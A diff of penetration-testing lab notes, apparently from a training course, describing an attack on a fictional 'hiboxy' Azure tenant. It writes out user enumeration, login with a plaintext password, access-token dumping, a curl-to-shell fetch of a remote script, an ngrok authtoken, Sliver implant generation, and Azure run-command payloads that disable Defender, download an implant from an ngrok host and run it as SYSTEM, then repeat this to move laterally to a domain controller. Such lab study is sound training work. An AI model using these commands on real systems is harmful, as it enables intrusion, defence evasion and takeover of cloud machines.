@@ -354,8 +354,6 @@ Invoke-AADIntReconAsOutsider -DomainName hiboxy.com | Format-Table
 - original Tenant name - can reveal patterns 
 - DesktopSSO is not enbled -> meaning AZUREADSSOACC not On Premises domain; not atk vector 
 
-Invoke-AADIntUserEnumerationAsOutsider -UserName "aparker@hiboxy.com"
-
 // target users for enumeration 
 Invoke-AADIntUserEnumerationAsOutsider -UserName "aparker@hiboxy.com"
 
@@ -447,9 +445,9 @@ az login -u aparker@hiboxy.com -p Oozle11
 cat ~/.azure/msal_token_cache.json
 az account get-access-token
 
-\\ fix docker issue: ip -brief addr show dev docker0 | grep 172 || sudo service docker restart
+        \\ fix docker issue: ip -brief addr show dev docker0 | grep 172 || sudo service docker restart
 
-// laun ScoutSuite docker 
+\\ view perms via ScoutSuite docker environment 
 docker run -v /tmp/scoutsuite:/tmp/scoutsuite -it rossja/ncc-scoutsuite
 
 // randomly gen user
@@ -457,14 +455,136 @@ shuf -n1 -e aparker abates mlara slopez
 
 // log in
 scout azure --user-account --report-dir /tmp/scoutsuite
+- requires creds 
+exit 
 
+// fire up repot in firefox...
+firefox /tmp/scoutsuite/azure*.html
 
+\\ work with cloud VMs 
+// view az vms 
+az vm list -o table
+az vm list -o table -d // could view public IPs if have read system net interface permissions 
+
+// read VM info
+az vm list
+        - find this block
+        "identity": {
+          "principalId": "502fafd9-1054-45e1-8051-b47262d297ce",
+         "tenantId": "1c0060e4-c4db-4777-a48b-34a1515e33bf",
+         "type": "SystemAssigned",
+          "userAssignedIdentities": null
+        },
+        // shows machine has a SystemAssigned managed Identity -> can lead to more permissions 
+        // how to use the 'control plane' of system to run 'data plan' actions
+
+// AZURE run command 
+az vm run-command invoke --command-id RunPowerShellScript --name Win10-Desktop$(shuf -i 1-5 -n1) -g HIBOXY --script 'Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | ConvertTo-Json -Depth 64 -Compress; whoami'
+- takes a while 
+- if can remotely run commands, can take over the system
+- commands are NT AUTH\SYSTEM - bc that's the run-command context 
+- seeing identity metadata; can probably get Access Tokens/ System Assigned edentity to run cmds in Azure environment 
+>>> CAN CONSTRUCT ATTACK 4 SHELL/LAT MOVEMENT
 
 
 
 ===================================================================}}}
 
 {{{ Section: Gain access, move laterally ================================================================
+
+\\NGROK setup
+// modify script and sliver implant 
+curl https://gist.githubusercontent.com/nidem/21d245167f0cbef2b836c57f67038135/raw/f19aa2a234587056b72dcc953268be6784d5441f/SEC560%2520I01%2520Lab%25205.8%2520Fix | /bin/sh
+
+// make 4 term screens: ngrok, python http, sliver, azure 
+
+// make ngrok account to get api key, config 
+https://www.ngrok.com 
+
+ngrok config add-authtoken 2C0TnYYZXx0dYd6ar61npbYclIV_26F2yD1FetEjzXLTkS6m3
+
+// use ngrok config to setup two tunnels -at same time- (bypass only 1 tunnel per free account restriction)
+
+~/.config/ngrok/ngrok.yml
+tunnels:
+  ngrok9000:
+    addr: 9000
+    proto: http
+  ngrok9001:
+    addr: 9001
+    proto: http
+
+// launch em 
+ngrok start ngrok9000 ngrok9001
+
+\\ python setup
+python3 -m http.server 9001
+
+
+\\ sliver setup + implant 
+sliver-server
+http -l 9000
+generate --os windows --skip-symbols -e --http https://NGROK9000_HOSTNAME_HERE
+generate --os windows --skip-symbols -e --http https://ff77-12-19-173-250.ngrok-free.app
+
+
+\\ Login to Azure 
+az login -u aparker@hiboxy.com -p Oozle11
+
+\\ remotely run commands 
+// set env variables 
+export TARGET="Win10-Desktop$(shuf -i 1-5 -n1)"
+echo $TARGET
+
+export NAME=<IMPLANT>
+export NAME=APPROPRIATE_AUDIENCE
+echo $NAME
+
+export NGROK9001=https://e526-12-19-173-250.ngrok-free.app
+echo $NGROK9001
+
+// execute payload - via task scheduler 
+az vm run-command invoke --command-id RunPowerShellScript --name $TARGET -g HIBOXY --script 'Set-MpPreference -DisableRealtimeMonitoring $true; wget '"$NGROK9001"'/'"$NAME"'.exe -UserAgent "CustomUA" -OutFile C:\Windows\Temp\'"$NAME"'.exe; SCHTASKS /Create /TN '"$NAME"' /TR "C:\Windows\Temp\'"$NAME"'.exe" /SC ONEVENT /EC Application /MO *[System/EventID=777] /RU "SYSTEM" /f; SCHTASKS /Run /TN '"$NAME"
+
+    Set-MpPreference -DisableRealtimeMonitoring $true disables Defender
+    wget ... downloads the executable file via Ngrok and our Python HTTP server
+    SCHTASKS /Create ... creates a scheduled task that runs as system
+    SCHTASKS /Run ... runs the task
+
+// why sched? multi use vs single use >>> direct implant call would HANG run-command process
+        - would eventually die and restart, killing implant. task sched: solves both by using scheduler as fork and run for the implant 
+
+// Remotely executing commands - Sliver 
+use <sessionID - first 2>
+shell
+y
+
+// situational awareness
+az login -i // authenticate from compromised host 
+az vm list -o table // list machines 
+
+# foothold options 
+    use standard attack tools on a Windows network to move laterally on the domain controller.Responder or Impacket
+    use Azure Control Plane like before to move laterally. We were not relying on legacy network protocols but the agents installed on the machines.
+
+
+
+\\ LATERAL MOVEMENT 
+export TARGET=hiboxy-dc1 // change to newly discovered host 
+
+az vm run-command invoke --command-id RunPowerShellScript --name hiboxy-dc1 -g HIBOXY --script Set-MpPreference -DisableRealtimeMonitoring $true; wget https://e526-12-19-173-250.ngrok-free.app/APPROPRIATE_AUDIENCE.exe -UserAgent "CustomUA" -OutFile C:\Windows\Temp\APPROPRIATE_AUDIENCE.exe; SCHTASKS /Create /TN APPROPRIATE_AUDIENCE /TR "C:\Windows\Temp\APPROPRIATE_AUDIENCE.exe" /SC ONEVENT /EC Application /MO *[System/EventID=777] /RU "SYSTEM" /f; SCHTASKS /Run /TN APPROPRIATE_AUDIENCE
+
+// make these changes 
+Add a single quote after --script so
+--script Set-MpPreference
+becomes
+--script 'Set-MpPreference
+
+- then run again to receive beacon
+exit
+use de
+whoami
+info
 
 
 
